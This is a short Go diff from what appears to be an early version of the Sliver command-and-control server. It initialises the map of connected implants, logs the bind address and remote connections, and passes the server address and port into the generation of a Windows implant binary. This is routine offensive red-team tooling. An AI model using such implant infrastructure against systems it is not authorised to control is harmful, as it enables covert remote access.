@@ -57,7 +57,7 @@ var (
 
 	// Yea I'm lazy, it'd be better not to use mutex
 	hiveMutex = &sync.RWMutex{}
-	hive      map[string]Sliver
+	hive      = &map[string]Sliver{}
 )
 
 func main() {
@@ -77,6 +77,7 @@ func main() {
 	events := make(chan Sliver)
 
 	log.Println("Starting listeners ...")
+	fmt.Printf("Binding to %s:%d", *server, *serverLPort)
 	ln, err := startSliverListener(*server, uint16(*serverLPort), events)
 	if err != nil {
 		log.Printf("Failed to start server")
@@ -87,12 +88,12 @@ func main() {
 		ln.Close()
 		hiveMutex.Lock()
 		defer hiveMutex.Unlock()
-		for _, sliver := range hive {
+		for _, sliver := range *hive {
 			close(sliver.Send)
 		}
 	}()
 
-	path, err := GenerateImplantBinary(windowsPlatform, "amd64")
+	path, err := GenerateImplantBinary(windowsPlatform, "amd64", *server, uint16(*serverLPort))
 	if err != nil {
 		log.Printf("Erorr generating sliver: %v", err)
 	}
@@ -142,7 +143,7 @@ func acceptConnections(ln net.Listener, events chan Sliver) {
 }
 
 func handleSliverConnection(conn net.Conn, events chan Sliver) {
-	log.Printf("Accepted incoming connection: %v", conn)
+	log.Printf("Accepted incoming connection: %s", conn.RemoteAddr())
 
 	envelope, err := socketReadEnvelope(conn)
 	if err != nil {
@@ -166,12 +167,12 @@ func handleSliverConnection(conn net.Conn, events chan Sliver) {
 	}
 
 	hiveMutex.Lock()
-	hive[sliver.ID] = sliver
+	(*hive)[sliver.ID] = sliver
 	hiveMutex.Unlock()
 
 	defer func() {
 		hiveMutex.Lock()
-		delete(hive, sliver.ID)
+		delete(*hive, sliver.ID)
 		hiveMutex.Unlock()
 		conn.Close()
 	}()
